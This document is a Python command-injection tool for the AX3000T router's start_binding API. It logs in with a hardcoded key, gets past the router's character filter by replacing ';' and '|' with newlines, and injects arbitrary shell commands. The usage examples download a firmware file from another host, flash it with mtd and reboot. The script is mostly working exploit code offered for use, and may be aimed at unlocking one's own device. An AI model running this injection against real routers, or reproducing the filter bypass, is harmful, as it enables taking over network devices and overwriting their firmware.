#!/usr/bin/env python3
"""
AX3000T 通用命令注入工具 (start_binding exploit)

用法:
    # 执行单条命令
    python3 rce.py --pwd 12345678 'cat /proc/version'

    # 执行多条命令 (自动拼接)
    python3 rce.py --pwd 12345678 \
      'curl -o /tmp/firmware.bin http://192.168.31.226:8080/firmware.bin' \
      'mtd write /tmp/firmware.bin /dev/mtdX' \
      'reboot'

    # 仅登录打印 stok，不执行命令
    python3 rce.py --stok-only --pwd 12345678
"""

import hashlib
import random
import time
import urllib.request
import urllib.parse
import json
import sys
import argparse

KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"


def sha256(s: str) -> str:
    return hashlib.sha256(s.encode('utf-8')).hexdigest()


def nonce() -> str:
    return f"0__{int(time.time())}_{random.randint(0, 9999)}"


def login(ip: str, pwd: str) -> str:
    n = nonce()
    data = urllib.parse.urlencode({
        "username": "admin",
        "password": sha256(n + sha256(pwd + KEY)),
        "logtype": "2",
        "nonce": n,
    }).encode()
    req = urllib.request.Request(f"http://{ip}/cgi-bin/luci/api/xqsystem/login", data=data)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    r = json.loads(urllib.request.urlopen(req, timeout=10).read())
    if r.get('code') != 0:
        raise Exception(f"登录失败: {r}")
    return r['token']


def inject(ip: str, stok: str, cmd: str) -> dict:
    """通过 start_binding 注入单条命令"""
    # hackCheck 过滤 ; 和 |，用 \n 替代
    cmd = cmd.replace(';', '\n').replace('|', '\n')
    key = "1234' -X \n" + cmd + "\n logger -t X 'X"
    params = urllib.parse.urlencode({'uid': '1234', 'key': key})
    url = f"http://{ip}/cgi-bin/luci/;stok={stok}/api/xqsystem/start_binding?{params}"
    req = urllib.request.Request(url)
    try:
        r = json.loads(urllib.request.urlopen(req, timeout=30).read())
        return r
    except Exception as e:
        return {"code": 0, "_note": str(e)}


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AX3000T 命令注入')
    parser.add_argument('cmds', nargs='*', help='要执行的命令')
    parser.add_argument('--ip', default='192.168.31.1')
    parser.add_argument('--pwd', help='管理密码')
    parser.add_argument('--stok', help='已有 stok')
    parser.add_argument('--stok-only', action='store_true', help='仅获取 stok')
    args = parser.parse_args()

    stok = args.stok
    if not stok:
        if not args.pwd:
            args.pwd = input('管理密码: ')
        stok = login(args.ip, args.pwd)

    if args.stok_only:
        print(json.dumps({"stok": stok}))
        sys.exit(0)

    if not args.cmds:
        print(json.dumps({"stok": stok, "msg": "未输入命令（加 --stok-only 仅获取 stok）"}, ensure_ascii=False))
        sys.exit(0)

    # 合并多条命令
    full = " ; ".join(args.cmds)
    results = inject(args.ip, stok, full)

    out = {
        "stok": stok,
        "command": full,
        "inject_ok": results.get('code') == 0,
        "response": results,
    }
    print(json.dumps(out, ensure_ascii=False))
    if not out["inject_ok"]:
        sys.exit(1)
